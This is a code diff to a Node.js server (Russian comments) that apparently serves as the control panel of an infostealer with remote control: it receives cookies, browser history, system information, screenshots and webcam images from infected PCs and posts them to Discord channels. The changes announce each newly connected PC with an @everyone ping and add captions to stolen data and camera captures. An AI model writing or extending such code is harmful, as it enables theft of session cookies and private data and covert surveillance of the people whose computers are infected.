@@ -1,6 +1,13 @@
 // server.js
 import express from "express";
-import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
+import { 
+    Client, 
+    GatewayIntentBits, 
+    ActionRowBuilder, 
+    ButtonBuilder, 
+    ButtonStyle, 
+    ChannelType 
+} from "discord.js";
 import { WebSocketServer } from "ws";
 import http from "http";
 import crypto from "crypto";
@@ -48,8 +55,15 @@ bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag
 bot.login(DISCORD_BOT_TOKEN);
 
 // ---------- Утилиты ----------
-function shortHash(s, len = 8) { return crypto.createHash('sha1').update(s).digest('hex').slice(0, len); }
-function safeChannelName(prefix, id) { return `${prefix}-${shortHash(id, 8)}`.toLowerCase().replace(/[^a-z0-9\-]/g, '-').slice(0, 90); }
+function shortHash(s, len = 8) { 
+    return crypto.createHash('sha1').update(s).digest('hex').slice(0, len); 
+}
+function safeChannelName(prefix, id) { 
+    return `${prefix}-${shortHash(id, 8)}`
+        .toLowerCase()
+        .replace(/[^a-z0-9\-]/g, '-')
+        .slice(0, 90); 
+}
 
 async function logToDiscord(msg) {
     try {
@@ -142,26 +156,73 @@ app.post("/upload-pc", async (req, res) => {
         const category = await getOrCreateCategory(guild, CATEGORY_BASE_PC);
         const channelName = safeChannelName('pc', pcId);
         let finalChannel = null;
+        let isNewPc = false;
+
         if (channelByPC[pcId]) {
             finalChannel = await guild.channels.fetch(channelByPC[pcId]).catch(() => null);
         }
         if (!finalChannel) {
             finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
             channelByPC[pcId] = finalChannel.id;
+            isNewPc = true;
         }
 
-        const files = [];
-        if (cookies) files.push({ attachment: Buffer.from(JSON.stringify({ cookies }, null, 2)), name: `${channelName}-cookies.json` });
-        if (history) files.push({ attachment: Buffer.from(JSON.stringify({ history }, null, 2)), name: `${channelName}-history.json` });
-        if (systemInfo) files.push({ attachment: Buffer.from(JSON.stringify({ systemInfo }, null, 2)), name: `${channelName}-system.json` });
-        if (screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-screenshot.jpeg` });
+        // ---------- Оповещение о новом ПК ----------
+        if (isNewPc) {
+            const logChannel = await getOrCreateLogChannel(guild);
+            await logChannel.send(`🚀 Новый ПК подключен: **${pcId}** <@everyone>`);
+        }
 
-        const messageOptions = { components: createControlButtons(pcId) };
-        if (files.length) messageOptions.files = files; else messageOptions.content = `🟢 ПК ${pcId} обновлён`;
+        // ---------- Формируем файлы и подписи ----------
+        const files = [];
+        const descriptions = [];
+
+        if (cookies) {
+            files.push({
+                attachment: Buffer.from(JSON.stringify({ cookies }, null, 2)),
+                name: `${channelName}-cookies.json`
+            });
+            descriptions.push("🍪 **Cookies** — сохранены");
+        }
+
+        if (history) {
+            files.push({
+                attachment: Buffer.from(JSON.stringify({ history }, null, 2)),
+                name: `${channelName}-history.json`
+            });
+            descriptions.push("📜 **История браузера** — сохранена");
+        }
+
+        if (systemInfo) {
+            files.push({
+                attachment: Buffer.from(JSON.stringify({ systemInfo }, null, 2)),
+                name: `${channelName}-system.json`
+            });
+            descriptions.push("💻 **Системная информация** — сохранена");
+        }
+
+        if (screenshot) {
+            files.push({
+                attachment: Buffer.from(screenshot, "base64"),
+                name: `${channelName}-screenshot.jpeg`
+            });
+            descriptions.push("🖼️ **Скриншот** — сохранён");
+        }
+
+        let contentMsg = `🟢 ПК **${pcId}** обновлён\n\n` + descriptions.join("\n");
+        const messageOptions = {
+            content: contentMsg,
+            components: createControlButtons(pcId)
+        };
+        if (files.length) messageOptions.files = files;
+
         await finalChannel.send(messageOptions);
 
         res.json({ success: true });
-    } catch (e) { await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`); res.status(500).json({ error: e.message }); }
+    } catch (e) { 
+        await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`); 
+        res.status(500).json({ error: e.message }); 
+    }
 });
 
 // ---------- Ping ----------
@@ -191,7 +252,6 @@ app.post("/upload-cam", async (req, res) => {
         camLastUpload[camId] = Date.now();
 
         const guild = await bot.guilds.fetch(GUILD_ID);
-        // Проверка активности камеры
         const isInactive = Date.now() - camLastUpload[camId] > CAM_INACTIVE_THRESHOLD;
         const categoryName = isInactive ? CATEGORY_ARCHIVE_CAM : CATEGORY_BASE_CAM;
         const category = await getOrCreateCategory(guild, categoryName);
@@ -208,7 +268,10 @@ app.post("/upload-cam", async (req, res) => {
 
         const buffer = Buffer.from(screenshot, "base64");
         if (buffer.length <= MAX_FILE_SIZE) {
-            await finalChannel.send({ files: [{ attachment: buffer, name: `${channelName}.jpg` }] });
+            await finalChannel.send({
+                content: `📷 Новое изображение с камеры **${camId}** (${new Date().toLocaleTimeString()})`,
+                files: [{ attachment: buffer, name: `${channelName}.jpg` }]
+            });
         }
 
         res.json({ success: true });
